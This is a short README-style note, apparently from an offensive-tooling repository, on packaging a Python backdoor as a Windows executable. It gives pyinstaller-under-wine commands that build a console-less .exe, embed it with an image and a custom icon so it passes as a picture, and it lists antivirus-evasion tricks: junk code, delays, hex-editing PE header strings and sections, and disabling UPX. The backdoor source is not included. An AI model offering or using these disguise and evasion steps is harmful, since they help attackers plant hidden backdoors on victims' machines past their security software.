# Backdoor on windows 
	
	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe client_backdoor.py --onefile --noconsole

The *.exe file is in dist/

# Installing mss library with pip :
`wine /root/.wine/drive_c/pyinstaller.exe -m pip install mss==4.0.2`  --> Tout simplement ...

# Embedding backdoor in a image 
		
	wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "<path_to_your_image>;." --onefile --noconsole --icon <path_to_your_.ico> client_backdoor.py

In order to make a .ico go to --> `https://convertico.com/jpg-to-ico/` --> create the .ico

# Bypass antiviruses
Add random function in your script for example addition function 
Add some random delay
We can change bytes in `hexeditor <backdoor.exe>` but be careful to not change bytes that will crash the program.<br>
We can change bytes of "This program cannot run in DOS mode", "text" and "data"
We can add `--noupx` when we do our pynstaller compilation to exe file if the antivirus detects us.
